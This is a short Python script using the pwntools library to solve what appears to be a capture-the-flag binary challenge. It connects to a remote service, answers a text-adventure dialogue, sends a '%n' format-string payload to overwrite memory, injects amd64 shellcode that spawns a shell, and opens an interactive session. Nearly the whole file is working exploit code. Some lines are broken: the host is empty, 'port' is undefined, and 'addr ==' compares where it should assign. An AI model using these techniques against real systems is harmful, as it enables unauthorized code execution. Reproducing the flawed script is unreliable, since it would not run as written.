from pwn import *

shell = asm(shellcraft.amd64.linux.sh(),arch="amd64")

# Creates a TCP or UDP-connection to a remote host. It supports both IPv4 and IPv6.
r = remote("",port)

payload = "%9x,%9x,%9x,%9x,%9x,%35x%n"

# Receive data until one of delims is encountered.
r.recvuntil("secret[0] is ")
addr == str(int(r.recvuntil("\n")[:-1],16))
r.sendlineafter("What should your character's name be:","ailx10")
r.sendlineafter("So, where you will go?east or up?:","east")
r.sendlineafter("go into there(1), or leave(0)?:","1")
r.sendlineafter("'Give me an address'",addr)
r.sendlineafter("And, you wish is:",payload)
r.sendlineafter("Wizard: I will help you! USE YOU SPELL",shell)

r.interactive()